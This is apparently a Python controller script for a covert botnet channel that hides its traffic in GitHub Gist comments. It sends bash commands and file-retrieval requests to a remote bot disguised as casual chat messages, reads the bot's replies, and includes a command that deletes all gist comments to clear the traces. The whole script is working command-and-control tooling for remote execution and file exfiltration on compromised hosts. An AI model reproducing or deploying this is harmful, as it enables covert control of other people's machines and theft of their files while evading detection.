## !/usr/bin/python
import json
import sys
import time
import requests

if len(sys.argv) < 3:
    print('Pleas check the README.md you did not pass enough arguments')
    print('You should execute it:')
    print('python not-bot.py GITHUB_TOKEN GIST_ID')
    exit(1)

# API constants
TOKEN = sys.argv[1]
GIST_URL = 'https://api.github.com/gists/' + sys.argv[2] + '/'
GIST_COMM = GIST_URL + 'comments?accept=application/vnd.github.v3+json'

# Chat constants
MESS_TO_BOT = 'Could sb. say what is: '
MESS_FROM_BOT_CMD = 'Hmm, if I execute it I get the next output: '
MESS_FROM_BOT_PONG = 'Hello, I am here :-) What do you need?'
MESS_TO_BOT_PING = 'Hi, is anybody here?'
MESS_TO_BOT_GET_FILE='Hello, do you have: '

def match_bot_commands(cmd):
    cmd_to_bot = ''

    if cmd == 'ping':
        cmd_to_bot = MESS_TO_BOT_PING
    elif cmd.find('get') == 0:
        cmd_to_bot = MESS_TO_BOT_GET_FILE + cmd[len('get') + 1::] + '?'
    else:
        cmd_to_bot = MESS_TO_BOT + cmd

    requests.post(GIST_COMM, data=json.dumps({'body': cmd_to_bot}),
                  headers={'Authorization': 'token '+TOKEN})

# local initialization of the last id comment
last_id_comment = max(len(requests.get(GIST_COMM, headers={'Authorization': 'token '+TOKEN}).json()), 0)

print('Hi, I\'m not a controller ;-)')

while True:
    str_in = input('Enter what you want to execute (--help to print help page, "exit" to exit): ')

    if str_in == 'exit':
        exit(0)
    elif str_in == '--help':
        print('Existed commands:')
        print('--help - to print that')
        print('ping - to check if is alive bot')
        print('delete - to clear the gist and delete all messages')
        print('get <path_to_file> - to copy a file in <path_to_file> from a bot to /tmp/ directory')
        print('cmd - execute a bash command where \'cmd\' - a bash command')
    elif str_in == 'delete':
        data = requests.get(GIST_COMM, headers={'Authorization': 'token '+TOKEN}).json()
        for i in data:
            url_to_del = GIST_URL+'comments/' + str(i['id']) + '?accept=application/vnd.github.v3+json'
            requests.delete(url_to_del, headers={'Authorization': 'token '+TOKEN})
    else:
        match_bot_commands(str_in)
        time.sleep(3)
        data = requests.get(GIST_COMM, headers={'Authorization': 'token '+TOKEN}).json()
        for i in range(last_id_comment, len(data)):
            if data[i]['body'].find(MESS_FROM_BOT_CMD) == 0\
                or data[i]['body'].find(MESS_FROM_BOT_PONG) == 0:
                print(data[i]['body'])
        last_id_comment = len(data)

